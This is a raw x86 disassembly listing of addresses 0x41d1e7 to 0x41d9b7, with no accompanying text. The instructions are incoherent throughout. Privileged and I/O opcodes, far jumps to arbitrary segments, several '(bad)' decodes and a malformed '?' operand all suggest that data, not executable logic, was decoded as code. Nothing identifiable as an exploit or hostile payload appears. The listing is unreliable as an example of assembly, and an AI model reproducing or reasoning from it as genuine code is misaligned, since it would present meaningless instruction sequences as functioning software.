  41d1e7:	or     BYTE PTR [ebp-0x4b],dl
  41d1ea:	cdq    
  41d1eb:	mul    DWORD PTR [edx-0x49078f7]
  41d1f1:	popf   
  41d1f2:	aaa    
  41d1f3:	clc    
  41d1f4:	icebp  
  41d1f5:	retf   0xe7c1
  41d1f8:	test   DWORD PTR [ecx-0x60b853b3],ecx
  41d1fe:	sti    
  41d1ff:	dec    eax
  41d200:	ror    BYTE PTR [edi+0x5f],cl
  41d203:	adc    ch,al
  41d205:	mov    esp,0xded7c998
  41d20a:	push   esp
  41d20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d20c:	pop    edi
  41d20d:	adc    al,BYTE PTR [ebx]
  41d20f:	leave  
  41d210:	xor    al,0xc7
  41d212:	scas   al,BYTE PTR es:[edi]
  41d213:	mov    ecx,0xc09da5dc
  41d218:	jl     0x41d26a
  41d21a:	hlt    
  41d21b:	jge    0x41d261
  41d21d:	jno    0x41d271
  41d21f:	dec    edx
  41d220:	mov    edi,0xd774f5a7
  41d225:	or     BYTE PTR [ebp+ecx*8+0x6be9aeb2],cl
  41d22c:	in     eax,0x30
  41d22e:	loope  0x41d1f7
  41d230:	mov    esp,0x2c747c58
  41d235:	pop    ecx
  41d236:	pop    ds
  41d237:	jle    0x41d296
  41d239:	pop    eax
  41d23a:	and    DWORD PTR [eax-0x87c7596],esi
  41d240:	xchg   ecx,eax
  41d241:	or     BYTE PTR [edx+0x64],dl
  41d244:	in     eax,0x2a
  41d246:	repz cmp eax,0x31b4debc
  41d24c:	sub    esp,DWORD PTR [edi-0x5a37108c]
  41d252:	mov    BYTE PTR [ebx],0xa6
  41d255:	sub    bl,ah
  41d257:	std    
  41d258:	outs   dx,DWORD PTR ds:[esi]
  41d259:	xor    edx,eax
  41d25b:	cmc    
  41d25c:	imul   bh
  41d25e:	or     ah,BYTE PTR [eax+0x7b973483]
  41d264:	add    eax,0x8f6f58c7
  41d269:	mov    ah,dh
  41d26b:	ja     0x41d290
  41d26d:	iret   
  41d26e:	fidivr WORD PTR [edx-0x334e3ad9]
  41d274:	mov    ebp,0x61778459
  41d279:	mov    ecx,eax
  41d27b:	sub    eax,0x569b4067
  41d280:	(bad)
  41d285:	js     0x41d2c3
  41d287:	mov    edx,0xf7b371e8
  41d28c:	icebp  
  41d28d:	push   ss
  41d28e:	mov    ebx,0x2a41c946
  41d293:	and    DWORD PTR [edx],edx
  41d295:	hlt    
  41d296:	sub    eax,0xd15eb6aa
  41d29b:	mov    ah,0xa4
  41d29d:	dec    edx
  41d29e:	push   0x41ab4615
  41d2a3:	push   edx
  41d2a4:	jmp    0x41d311
  41d2a6:	push   esp
  41d2a7:	pusha  
  41d2a8:	sub    ebx,ebx
  41d2aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2ab:	cwde   
  41d2ac:	inc    eax
  41d2ad:	mov    cl,0x7f
  41d2af:	js     0x41d2b0
  41d2b1:	daa    
  41d2b2:	jmp    0x41d23e
  41d2b4:	mov    dl,0x2d
  41d2b6:	pop    ss
  41d2b7:	adc    edx,DWORD PTR [esi-0x27]
  41d2ba:	mov    DWORD PTR [ebx+0x43],ebp
  41d2bd:	inc    ebx
  41d2be:	aas    
  41d2bf:	js     0x41d2d0
  41d2c1:	dec    ebx
  41d2c2:	in     eax,dx
  41d2c3:	loopne 0x41d2e0
  41d2c5:	add    BYTE PTR [eax+0x7b],0xd1
  41d2c9:	cmp    DWORD PTR [edi+0x3db1e250],edi
  41d2cf:	out    dx,al
  41d2d0:	jb     0x41d25f
  41d2d2:	sbb    BYTE PTR ds:0x83b22621,0xc2
  41d2d9:	jns    0x41d32a
  41d2db:	dec    esp
  41d2dc:	jmp    0xa3a5badc
  41d2e1:	jl     0x41d362
  41d2e3:	xlat   BYTE PTR ds:[ebx]
  41d2e4:	mov    esp,0xb2365c77
  41d2e9:	add    eax,0x1be5e6ce
  41d2ee:	push   esp
  41d2ef:	shr    DWORD PTR [edi-0x4b],0x60
  41d2f3:	and    ch,BYTE PTR [ecx-0x43]
  41d2f6:	in     al,dx
  41d2f7:	test   BYTE PTR [ecx-0x1c],cl
  41d2fa:	cmp    DWORD PTR [esi],edi
  41d2fc:	dec    edx
  41d2fd:	sub    al,0xc7
  41d2ff:	retf   0xd92b
  41d302:	inc    ebx
  41d303:	inc    ebp
  41d304:	repz repz fwait
  41d307:	outs   dx,DWORD PTR ds:[esi]
  41d308:	sub    ah,al
  41d30a:	pusha  
  41d30b:	cmp    ebp,esp
  41d30d:	dec    esi
  41d30e:	inc    edx
  41d30f:	inc    edx
  41d310:	or     BYTE PTR [ebp-0x7d],al
  41d313:	add    cl,ah
  41d315:	xchg   esi,eax
  41d316:	ss in  eax,dx
  41d318:	mov    DWORD PTR [esi+0x6fae1b15],ebp
  41d31e:	sub    BYTE PTR [esp+edx*4+0x5b],dh
  41d322:	sub    DWORD PTR [ecx-0x79],eax
  41d325:	mov    esi,0x3ab00aac
  41d32a:	dec    esi
  41d32b:	jbe    0x41d3aa
  41d32d:	stos   BYTE PTR es:[edi],al
  41d32e:	test   al,0x9b
  41d330:	mov    bl,BYTE PTR [edx+0x4a]
  41d333:	je     0x41d2bb
  41d335:	xor    al,0x5
  41d337:	loop   0x41d339
  41d339:	rcr    DWORD PTR [esi+0x755ed16b],1
  41d33f:	loopne 0x41d393
  41d341:	test   eax,0xa964a56b
  41d346:	fisttp WORD PTR [edx+0x74]
  41d349:	ins    DWORD PTR es:[edi],dx
  41d34a:	rsm    
  41d34c:	scas   al,BYTE PTR es:[edi]
  41d34d:	jnp    0x41d3a9
  41d34f:	adc    al,0xee
  41d351:	pop    ecx
  41d352:	adc    eax,0x4dc82685
  41d357:	mov    bl,0xe8
  41d359:	mov    ds:0x1854c2a6,eax
  41d35e:	ins    DWORD PTR es:[edi],dx
  41d35f:	ja     0x41d387
  41d361:	mov    cl,0x1d
  41d363:	push   eax
  41d364:	xor    DWORD PTR [eax+0x70],0xfffffff8
  41d368:	enter  0x8c9f,0x8a
  41d36c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d36d:	into   
  41d36e:	je     0x41d303
  41d370:	sbb    bh,BYTE PTR [eax]
  41d372:	pop    esi
  41d373:	nop
  41d374:	cli    
  41d375:	lods   eax,DWORD PTR ds:[esi]
  41d376:	jmp    0x79a1cf6a
  41d37b:	or     al,0x2
  41d37d:	push   ecx
  41d37e:	adc    edx,0xb65cdaef
  41d384:	sub    eax,0xe1a912a1
  41d389:	fsub   QWORD PTR [edx]
  41d38b:	add    esp,DWORD PTR [edi+eiz*2-0x23]
  41d38f:	ins    BYTE PTR es:[edi],dx
  41d390:	lods   al,BYTE PTR ds:[esi]
  41d391:	fnsave [edi-0x1388953e]
  41d397:	sbb    eax,0x4307a47a
  41d39c:	rcr    DWORD PTR [ebp-0x53],0xd8
  41d3a0:	xchg   edi,eax
  41d3a1:	jno    0x41d333
  41d3a3:	bnd je 0x41d334
  41d3a6:	std    
  41d3a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3a8:	into   
  41d3a9:	cmp    eax,0xb625d93
  41d3ae:	mov    WORD PTR ds:0xcc7b0067,cs
  41d3b4:	call   0x2f40:0xf477243e
  41d3bb:	lock stos BYTE PTR es:[edi],al
  41d3bd:	call   0xef8e:0xd651cca5
  41d3c4:	cmp    DWORD PTR [edi-0x45f4e252],esp
  41d3ca:	sub    cl,al
  41d3cc:	mov    ds:0x810214b6,eax
  41d3d1:	sub    eax,0xcfd04deb
  41d3d7:	(bad)  
  41d3d8:	repz mov ecx,edx
  41d3db:	out    0xf1,eax
  41d3dd:	mov    BYTE PTR [ecx],bl
  41d3df:	stos   DWORD PTR es:[edi],eax
  41d3e0:	mov    ebx,0xe09e2426
  41d3e5:	mov    ds:0x47920dd7,al
  41d3ea:	stos   BYTE PTR es:[edi],al
  41d3eb:	and    eax,0xe6140aee
  41d3f0:	jge    0x41d3a1
  41d3f2:	push   edx
  41d3f3:	jecxz  0x41d45e
  41d3f5:	aaa    
  41d3f6:	mov    ah,0x92
  41d3f8:	jg     0x41d3f1
  41d3fa:	mov    ds:0x6a7365e0,eax
  41d3ff:	jecxz  0x41d399
  41d401:	xchg   BYTE PTR [esi+ebp*8-0x77],cl
  41d405:	ja     0x41d3b1
  41d407:	enter  0x9e80,0x61
  41d40b:	lahf   
  41d40c:	mov    esi,0x24e2262a
  41d411:	adc    BYTE PTR [eax-0x42],ah
  41d414:	sub    DWORD PTR [ecx-0x3be4382a],0x7e2b0904
  41d41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d41f:	js     0x41d413
  41d421:	test   al,0x99
  41d423:	mov    bl,0xc3
  41d425:	mov    esp,0xc2ad6584
  41d42a:	bound  esp,QWORD PTR [esi]
  41d42c:	shr    DWORD PTR [ebp-0x7f810a89],1
  41d432:	xor    bh,bl
  41d434:	std    
  41d435:	test   DWORD PTR [ebp-0x2752d5d6],esi
  41d43b:	mov    ds:0x3cf53b44,eax
  41d440:	inc    ebx
  41d441:	xchg   ebx,eax
  41d442:	jae    0x41d4bf
  41d444:	lock retf 
  41d446:	mov    edi,0x1455a15d
  41d44b:	or     ch,BYTE PTR [esi-0x77]
  41d44e:	xor    ch,dl
  41d450:	or     DWORD PTR [ecx-0x612f9aaf],edi
  41d456:	push   ss
  41d457:	xor    BYTE PTR [edx+esi*4-0x78],ah
  41d45b:	or     ebx,eax
  41d45d:	iret   
  41d45e:	xor    eax,0x775d5f77
  41d463:	cmp    dh,BYTE PTR ds:0x872813ab
  41d46a:	add    eax,0x62c51626
  41d46f:	xlat   BYTE PTR ds:[ebx]
  41d470:	fiadd  DWORD PTR [esi+ebx*8+0x3a3b9c09]
  41d477:	xchg   edx,eax
  41d478:	pop    ebx
  41d479:	cli    
  41d47a:	add    eax,0x6feb32c0
  41d47f:	test   eax,0x41dac7af
  41d484:	(bad)
  41d488:	aaa    
  41d489:	push   ds
  41d48a:	cmp    eax,0x69cd8986
  41d48f:	arpl   WORD PTR [edx],sp
  41d491:	je     0x41d4b0
  41d493:	push   0xa6deb1ca
  41d498:	mov    ch,0x4
  41d49a:	in     al,0xf4
  41d49c:	imul   ecx,DWORD PTR [eax-0x8430307],0x3a870f3f
  41d4a6:	scas   al,BYTE PTR es:[edi]
  41d4a7:	xor    ah,BYTE PTR [ebx+ecx*4+0x26]
  41d4ab:	rol    DWORD PTR [edx+0x648908f2],cl
  41d4b1:	addr16 out 0xc,eax
  41d4b4:	add    dh,dh
  41d4b6:	arpl   WORD PTR [edx+edi*8-0x3e],ax
  41d4ba:	inc    edx
  41d4bb:	cs mov ebp,0x8a7b6606
  41d4c1:	dec    ebp
  41d4c2:	cmp    al,0xba
  41d4c4:	test   esp,ebx
  41d4c6:	bswap  eax
  41d4c8:	jmp    0x24d0:0xf7df9f46
  41d4cf:	js     0x41d4fc
  41d4d1:	ds xor al,0x3c
  41d4d4:	shr    BYTE PTR [edx],1
  41d4d6:	xor    dl,cl
  41d4d8:	cwde   
  41d4d9:	add    ebp,DWORD PTR [edx+0x769e5eab]
  41d4df:	ret    0x5101
  41d4e2:	nop
  41d4e3:	jle    0x41d4e8
  41d4e5:	pop    edi
  41d4e6:	ret    
  41d4e7:	jne    0x41d54f
  41d4e9:	shl    DWORD PTR [ebp+0xd],1
  41d4ec:	sub    ecx,edx
  41d4ee:	and    BYTE PTR [ebx-0xc997945],ch
  41d4f4:	mov    ds:0xef33bc53,eax
  41d4f9:	dec    ecx
  41d4fa:	mov    esp,ss
  41d4fc:	fidivr DWORD PTR [ebx+edx*8]
  41d4ff:	test   esi,0xb7ec657c
  41d505:	fist   DWORD PTR [edx+0x4f323cb5]
  41d50b:	cmp    DWORD PTR [eax+0x1c],esi
  41d50e:	cs in  ax,dx
  41d511:	mov    eax,DWORD PTR [edx]
  41d513:	fwait
  41d514:	gs icebp 
  41d516:	cmp    eax,0xa6d8e5e2
  41d51b:	sub    DWORD PTR [ecx+0x26d2ae33],ecx
  41d521:	cmp    BYTE PTR [esi-0x28],ah
  41d524:	inc    ecx
  41d525:	push   ds
  41d526:	mov    eax,ds:0x8b429a50
  41d52b:	ret    0x8337
  41d52e:	sbb    al,0xd8
  41d530:	or     al,0x12
  41d532:	je     0x41d52e
  41d534:	mov    esi,0xedd05f34
  41d539:	adc    ebp,DWORD PTR [ebx]
  41d53b:	add    eax,0x429bec46
  41d540:	push   es
  41d541:	dec    esi
  41d542:	stc    
  41d543:	pop    esp
  41d544:	cmc    
  41d545:	mov    dh,BYTE PTR [ebp-0x49]
  41d548:	les    edx,FWORD PTR [eax+0x502cccf9]
  41d54e:	fs jg  0x41d516
  41d551:	rcr    DWORD PTR ds:0x2b40f94e,cl
  41d557:	cli    
  41d558:	inc    eax
  41d559:	push   edx
  41d55a:	add    al,0xe8
  41d55c:	jbe    0x41d559
  41d55e:	shl    BYTE PTR [ecx-0x741e91b2],0x37
  41d565:	lds    bx,DWORD PTR [edi+ebp*4-0x63]
  41d56a:	add    BYTE PTR [edi-0xb493d04],dl
  41d570:	push   0x7f
  41d572:	fisttp DWORD PTR [ebx+ebp*8]
  41d575:	jp     0x41d575
  41d577:	cmp    ebp,DWORD PTR [ebx]
  41d579:	or     al,0x65
  41d57b:	ret    
  41d57c:	cwde   
  41d57d:	enter  0x1576,0x10
  41d581:	push   ecx
  41d582:	push   ebp
  41d583:	fst    QWORD PTR [ebp+eiz*8-0x58]
  41d587:	ret    0x450b
  41d58a:	add    dl,bh
  41d58c:	dec    ebp
  41d58d:	adc    ebp,esi
  41d58f:	imul   edi,ecx,0xffffff89
  41d592:	jmp    0x41d5f7
  41d594:	mov    al,0x18
  41d596:	dec    ebp
  41d597:	call   0xe6b2:0xd06dafc5
  41d59e:	add    DWORD PTR [edx],0xbb9383da
  41d5a4:	push   ecx
  41d5a5:	pop    es
  41d5a6:	xor    DWORD PTR [edx-0x37],esp
  41d5a9:	xchg   ecx,eax
  41d5aa:	xor    BYTE PTR [ebx+0x692065c5],0xc1
  41d5b1:	mov    dh,0x6c
  41d5b3:	mov    ecx,0x85c1af0a
  41d5b8:	pop    ds
  41d5b9:	jmp    0x41d632
  41d5bb:	out    0x2e,al
  41d5bd:	mov    bh,0xc2
  41d5bf:	or     al,0xb5
  41d5c1:	test   eax,0x48580c75
  41d5c6:	call   0xcea3:0x6be5a6d2
  41d5cd:	imul   esi,ebx,0x4b
  41d5d0:	pop    ecx
  41d5d1:	or     dh,BYTE PTR [ebp-0x30]
  41d5d4:	inc    esi
  41d5d5:	and    DWORD PTR [ebx+0x572d7a98],ebx
  41d5db:	or     eax,0x9fe627d9
  41d5e0:	and    dh,BYTE PTR [ebx+eiz*1-0x1]
  41d5e4:	cdq    
  41d5e5:	adc    DWORD PTR [eax],ebp
  41d5e7:	adc    ebx,DWORD PTR [ebp-0x7a63eaca]
  41d5ed:	add    eax,0xfffffff2
  41d5f0:	retf   0xa223
  41d5f3:	mov    bh,0xa7
  41d5f5:	jmp    0xa06f:0x2eb57eeb
  41d5fc:	xor    BYTE PTR [ebx-0x554c7324],dh
  41d602:	mov    ds:0x7270dd05,al
  41d607:	jle    0x41d5ab
  41d609:	jle    0x41d613
  41d60b:	or     BYTE PTR [ecx+0x500ae461],cl
  41d611:	fadd   st(2),st
  41d613:	sub    DWORD PTR [esp+eiz*8-0x1543b491],ebp
  41d61a:	ins    BYTE PTR es:[edi],dx
  41d61b:	nop
  41d61c:	fcomp  st(2)
  41d61e:	mov    ecx,0xc5532655
  41d623:	gs cli 
  41d625:	dec    DWORD PTR [edx-0x2d]
  41d628:	push   es
  41d629:	xor    ebp,DWORD PTR [edx+0xe]
  41d62c:	and    ebx,DWORD PTR [eax+ebx*4-0x1d672bb]
  41d633:	pushf  
  41d634:	xchg   ebx,eax
  41d635:	test   eax,0x602fcf13
  41d63a:	scas   al,BYTE PTR es:[edi]
  41d63b:	mov    ?,WORD PTR [esi-0x8d64086]
  41d641:	neg    DWORD PTR [ebx]
  41d643:	xor    DWORD PTR [edi],ecx
  41d645:	add    DWORD PTR [eax],esi
  41d647:	inc    esi
  41d648:	(bad)  
  41d64a:	inc    ebp
  41d64b:	add    eax,0x8d1e9fa6
  41d650:	sub    bl,ah
  41d652:	mov    esp,0x20b2e36f
  41d657:	je     0x41d666
  41d659:	(bad)  
  41d65b:	jnp    0x41d665
  41d65d:	test   eax,0xd0f94e0b
  41d662:	xchg   ebx,eax
  41d663:	and    ah,ch
  41d665:	lock mov ah,0xee
  41d668:	fstp   DWORD PTR [edx+0x70]
  41d66b:	outs   dx,DWORD PTR ds:[esi]
  41d66c:	popf   
  41d66d:	je     0x41d6e7
  41d66f:	ret    0x463b
  41d672:	mov    ds:0xe4d8a89f,eax
  41d677:	xlat   BYTE PTR ds:[ebx]
  41d678:	fst    st(0)
  41d67a:	ja     0x41d698
  41d67c:	out    0xe7,al
  41d67e:	stos   DWORD PTR es:[edi],eax
  41d67f:	jge    0x41d694
  41d681:	ret    0x1b27
  41d684:	sub    eax,edi
  41d686:	(bad)  
  41d687:	shl    BYTE PTR [edx+esi*1-0x5e],cl
  41d68b:	sbb    al,0x29
  41d68d:	or     eax,0x5151bcbe
  41d692:	jne    0x41d691
  41d694:	cmp    BYTE PTR [eax+ecx*1-0x42],0x64
  41d699:	pop    es
  41d69a:	aad    0x49
  41d69c:	push   ds
  41d69d:	dec    eax
  41d69e:	arpl   WORD PTR [ecx],di
  41d6a0:	adc    eax,0x6aeac706
  41d6a5:	in     al,dx
  41d6a6:	sbb    DWORD PTR fs:0x34126c03,ebx
  41d6ad:	adc    DWORD PTR [eax],0xffffffcc
  41d6b0:	iret   
  41d6b1:	sbb    eax,0x121414a0
  41d6b6:	sar    DWORD PTR [ecx+0x6aef170a],cl
  41d6bc:	mov    ds:0xfe8862cd,al
  41d6c1:	push   ebx
  41d6c2:	mov    ebx,0xf1d77c40
  41d6c7:	mov    ah,0x4f
  41d6c9:	push   edx
  41d6ca:	lahf   
  41d6cb:	add    al,0xc9
  41d6cd:	int    0xf6
  41d6cf:	fcmovbe st,st(4)
  41d6d1:	push   ebx
  41d6d2:	lahf   
  41d6d3:	lods   eax,DWORD PTR ds:[esi]
  41d6d4:	mov    ebx,0x6434c83a
  41d6d9:	aam    0xfc
  41d6db:	xchg   ecx,eax
  41d6dc:	and    eax,0xae7e7c35
  41d6e1:	sbb    DWORD PTR [eax+esi*8-0x7d],ebp
  41d6e5:	sub    eax,0x10cc2eea
  41d6ea:	or     dl,al
  41d6ec:	loope  0x41d758
  41d6ee:	adc    dl,BYTE PTR [ebx-0x6a]
  41d6f1:	scas   al,BYTE PTR es:[edi]
  41d6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f3:	fmul   DWORD PTR [ebx+0x74]
  41d6f6:	dec    ecx
  41d6f7:	ror    BYTE PTR [edx-0x8ca0ee3],cl
  41d6fd:	add    bl,BYTE PTR [esi-0x78]
  41d700:	icebp  
  41d701:	div    DWORD PTR gs:[esi+edi*8+0x69]
  41d706:	adc    DWORD PTR [ebp-0x49],esi
  41d709:	and    eax,0x7e9e0110
  41d70e:	out    dx,eax
  41d70f:	cld    
  41d710:	cmove  esp,DWORD PTR [ebp+ebp*2-0x14]
  41d715:	std    
  41d716:	or     eax,0x5b2e0f56
  41d71b:	lds    esi,FWORD PTR [esi+ebp*2]
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	dec    esi
  41d720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d721:	fstp   QWORD PTR [ecx-0x6fbf611]
  41d727:	retf   0x49f5
  41d72a:	cmp    ebp,DWORD PTR [edi+0x66]
  41d72d:	sti    
  41d72e:	jbe    0x41d733
  41d730:	or     esi,DWORD PTR [eax]
  41d732:	xchg   ebp,eax
  41d733:	stc    
  41d734:	out    0xb6,eax
  41d736:	pop    ds
  41d737:	fnsave [edi+ebx*8-0x7f]
  41d73b:	out    0x25,al
  41d73d:	test   eax,0x794c7106
  41d742:	std    
  41d743:	aad    0xdf
  41d745:	mov    bl,0x6b
  41d747:	mov    ecx,0x69b63b9
  41d74c:	add    DWORD PTR [edi+eax*8+0x5ee782d4],0xf9b389ed
  41d757:	inc    esi
  41d758:	div    esi
  41d75a:	or     ah,BYTE PTR [edx+eiz*4-0x75]
  41d75e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d75f:	add    ecx,esi
  41d761:	jns    0x41d780
  41d763:	push   esi
  41d764:	retf   
  41d765:	nop
  41d766:	mov    ah,0xa0
  41d768:	or     ebp,DWORD PTR [ebx+0x2f]
  41d76b:	xchg   BYTE PTR [ecx],bh
  41d76d:	aas    
  41d76e:	dec    edi
  41d76f:	loop   0x41d764
  41d771:	cmp    DWORD PTR [ecx],0xd5985b46
  41d777:	inc    ebx
  41d778:	and    dl,BYTE PTR [eax-0x80]
  41d77b:	lds    eax,FWORD PTR [ecx-0x18635fb8]
  41d781:	push   es
  41d782:	scas   eax,DWORD PTR es:[edi]
  41d783:	aaa    
  41d784:	jmp    0xf028:0x784d37fb
  41d78b:	enter  0x677,0x74
  41d78f:	addr16 inc edi
  41d791:	mov    ebp,0x54ec632a
  41d796:	hlt    
  41d797:	call   0x4ff2cf16
  41d79c:	pop    ss
  41d79d:	pushf  
  41d79e:	loope  0x41d755
  41d7a0:	inc    edx
  41d7a1:	adc    esi,DWORD PTR [ecx+ecx*2+0x7a]
  41d7a5:	ficom  WORD PTR [ebp+eax*8+0x0]
  41d7a9:	jecxz  0x41d782
  41d7ab:	sbb    edi,ebx
  41d7ad:	ja     0x41d751
  41d7af:	scas   eax,DWORD PTR es:[edi]
  41d7b0:	test   BYTE PTR [edx-0x5f234f9],0x9c
  41d7b7:	lds    ecx,FWORD PTR [ebp-0x11]
  41d7ba:	loop   0x41d7a4
  41d7bc:	push   esi
  41d7bd:	mov    al,ds:0x1d7ab982
  41d7c2:	aad    0xbe
  41d7c4:	push   cs
  41d7c5:	js     0x41d7c7
  41d7c7:	push   edi
  41d7c8:	shr    BYTE PTR [ebp+0x200261ce],1
  41d7ce:	sahf   
  41d7cf:	jno    0x41d77c
  41d7d1:	push   0xeaeee1a9
  41d7d6:	mul    esp
  41d7d8:	addr16 mov cl,0x70
  41d7db:	xlat   BYTE PTR ds:[ebx]
  41d7dc:	push   ebx
  41d7dd:	test   al,0x72
  41d7df:	pop    ecx
  41d7e0:	rcr    DWORD PTR [esi],1
  41d7e2:	adc    bh,BYTE PTR [edx+0x21]
  41d7e5:	stos   BYTE PTR es:[edi],al
  41d7e6:	popw   ss
  41d7e8:	out    dx,eax
  41d7e9:	xor    eax,0x55a6b5d1
  41d7ee:	fstp   TBYTE PTR [edi+ebp*1]
  41d7f1:	rcl    DWORD PTR [ebp+0x1a],1
  41d7f4:	les    ebp,FWORD PTR [esi-0x2a]
  41d7f7:	test   DWORD PTR [eax-0x68],0x2db4bd44
  41d7fe:	inc    ebx
  41d7ff:	iret   
  41d800:	sub    eax,0xdd04b8fc
  41d805:	mov    bh,0x75
  41d807:	xchg   ebx,eax
  41d808:	shr    BYTE PTR [esi],cl
  41d80a:	fdivr  DWORD PTR [ebp+0x53]
  41d80d:	mov    BYTE PTR [edx+0x1141b264],ah
  41d813:	fdiv   st(4),st
  41d815:	xchg   esp,eax
  41d816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d817:	inc    ecx
  41d818:	ja     0x41d7e4
  41d81a:	inc    eax
  41d81b:	add    al,0xc0
  41d81d:	adc    ecx,DWORD PTR [edx]
  41d81f:	aad    0xf3
  41d821:	mov    ch,0x9c
  41d823:	aaa    
  41d824:	mov    esp,0xfe0e7b74
  41d829:	sti    
  41d82a:	pop    edi
  41d82b:	xor    DWORD PTR [ebx],esp
  41d82d:	jbe    0x41d87c
  41d82f:	in     al,0x87
  41d831:	out    0x64,eax
  41d833:	add    esi,esi
  41d835:	pop    ecx
  41d836:	sub    eax,0xef0580eb
  41d83b:	rcl    DWORD PTR [ebx],cl
  41d83d:	hlt    
  41d83e:	packssdw mm2,QWORD PTR [esi]
  41d841:	dec    esi
  41d842:	push   0x15d0fc72
  41d847:	jno    0x41d820
  41d849:	rcl    BYTE PTR [esi+0x74],0xe9
  41d84d:	push   cs
  41d84e:	cmc    
  41d84f:	(bad)  [eax+0x4f]
  41d852:	mov    bl,0x48
  41d854:	js     0x41d849
  41d856:	les    esi,FWORD PTR [ebx+0x163300f8]
  41d85c:	mov    ds:0xdbd72d26,al
  41d861:	xchg   esp,eax
  41d862:	inc    DWORD PTR [edi+0x15cf2f76]
  41d868:	fdiv   QWORD PTR ds:0xd0c6c9a9
  41d86e:	imul   eax,DWORD PTR [ebx+0x1704944d],0x52c81155
  41d878:	addr16 data16 jp 0x41d801
  41d87c:	or     BYTE PTR [esi-0x155af364],bh
  41d882:	rol    BYTE PTR [ebx-0x10844dbb],1
  41d888:	adc    al,0x8d
  41d88a:	fbld   TBYTE PTR [ecx-0x54]
  41d88d:	jecxz  0x41d862
  41d88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d890:	ja     0x41d8f4
  41d892:	pop    ebx
  41d893:	mov    ebp,0xeb061839
  41d898:	mov    eax,DWORD PTR [eax+0x53]
  41d89b:	jle    0x41d893
  41d89d:	mov    ds:0xb7b3c634,eax
  41d8a2:	pop    ebp
  41d8a3:	outs   dx,BYTE PTR ds:[esi]
  41d8a4:	repz xlat BYTE PTR ds:[ebx]
  41d8a6:	and    eax,0x3f3d25af
  41d8ab:	out    dx,al
  41d8ac:	mov    dh,0x2e
  41d8ae:	mov    dl,BYTE PTR [edx]
  41d8b0:	nop
  41d8b1:	clc    
  41d8b2:	rcr    DWORD PTR [eax+0x424cfa73],1
  41d8b8:	pushf  
  41d8b9:	xchg   ebp,eax
  41d8ba:	pop    ecx
  41d8bb:	push   esi
  41d8bc:	shl    BYTE PTR [ecx*4+0xcafaecb],cl
  41d8c3:	xchg   edi,eax
  41d8c4:	loop   0x41d899
  41d8c6:	outs   dx,BYTE PTR ds:[esi]
  41d8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8c8:	and    al,0x58
  41d8ca:	xlat   BYTE PTR ds:[ebx]
  41d8cb:	or     ebp,DWORD PTR [ebp+0x25]
  41d8ce:	mov    cl,0x97
  41d8d0:	test   al,0x71
  41d8d2:	call   DWORD PTR [ebp+eax*1-0x4f]
  41d8d6:	repnz mov ch,BYTE PTR [eax-0x480f7925]
  41d8dd:	ret    0x1373
  41d8e0:	mov    ebx,0x969a500b
  41d8e5:	adc    BYTE PTR [eax+0x17],ch
  41d8e8:	push   esp
  41d8e9:	(bad)  
  41d8ea:	(bad)  
  41d8ec:	cmc    
  41d8ed:	dec    esi
  41d8ee:	inc    esp
  41d8ef:	mov    al,ds:0x5693dfac
  41d8f4:	push   DWORD PTR [esi]
  41d8f6:	sub    bh,ah
  41d8f8:	or     DWORD PTR [edi],edx
  41d8fa:	sub    BYTE PTR es:[ecx+0x6a],bl
  41d8fe:	dec    edx
  41d8ff:	sti    
  41d900:	fwait
  41d901:	jo     0x41d898
  41d903:	xchg   edi,eax
  41d904:	call   FWORD PTR [eax+edi*2+0x50642d1a]
  41d90b:	call   0x7ad0:0x4f7d5679
  41d912:	mov    eax,0xe7096caa
  41d917:	jmp    edi
  41d919:	shl    DWORD PTR [ebp-0x45],1
  41d91c:	mov    al,0x8e
  41d91e:	out    dx,eax
  41d91f:	cwde   
  41d920:	mov    dl,BYTE PTR [edx]
  41d922:	jns    0x41d98e
  41d924:	rol    DWORD PTR [ecx],cl
  41d926:	ret    0x1058
  41d929:	push   ss
  41d92a:	sar    DWORD PTR [edi-0x11d82970],1
  41d930:	add    edx,eax
  41d932:	jne    0x41d98f
  41d934:	jae    0x41d8b7
  41d936:	jle    0x41d923
  41d938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d939:	lods   al,BYTE PTR ds:[esi]
  41d93a:	mov    ebp,0xc3335bae
  41d93f:	test   BYTE PTR [ebp-0x7],ch
  41d942:	or     ecx,DWORD PTR [eax+0x12]
  41d945:	gs sub al,0x9a
  41d948:	xor    al,0x2f
  41d94a:	ret    
  41d94b:	mov    esp,0x767d270b
  41d950:	mov    ebp,DWORD PTR [ebx-0x7de2301e]
  41d956:	adc    DWORD PTR [ebp-0x4d98134e],0x15302362
  41d960:	pop    ebp
  41d961:	sbb    BYTE PTR ds:0xea2c8af4,dl
  41d967:	dec    esi
  41d968:	adc    eax,0x21c73c92
  41d96d:	or     al,al
  41d96f:	ins    BYTE PTR es:[edi],dx
  41d970:	mov    fs,esi
  41d972:	jno    0x41d974
  41d974:	push   0x580b8f3d
  41d979:	and    BYTE PTR [esi],dl
  41d97b:	push   ecx
  41d97c:	push   0x45
  41d97e:	jb     0x41d9a6
  41d980:	adc    BYTE PTR [ebp+edi*1+0x30],dl
  41d984:	(bad)  
  41d985:	fcomip st,st(6)
  41d987:	xchg   edx,eax
  41d988:	jle    0x41d986
  41d98a:	aaa    
  41d98b:	call   0xf430:0xbd6ad302
  41d992:	push   esi
  41d993:	sahf   
  41d994:	es sbb al,0xf4
  41d997:	lock dec ecx
  41d999:	or     eax,0xc62dbffa
  41d99e:	jno    0x41d9b0
  41d9a0:	xchg   ebx,eax
  41d9a1:	sub    eax,0xffb085ba
  41d9a6:	pop    es
  41d9a7:	xor    dl,0x1e
  41d9aa:	jne    0x41d959
  41d9ac:	test   eax,0x5507c9eb
  41d9b1:	out    0x10,eax
  41d9b3:	mov    bl,0xc5
  41d9b5:	push   ss
  41d9b6:	dec    ecx
  41d9b7:	fld    QWORD PTR ds:0xce4d63fa
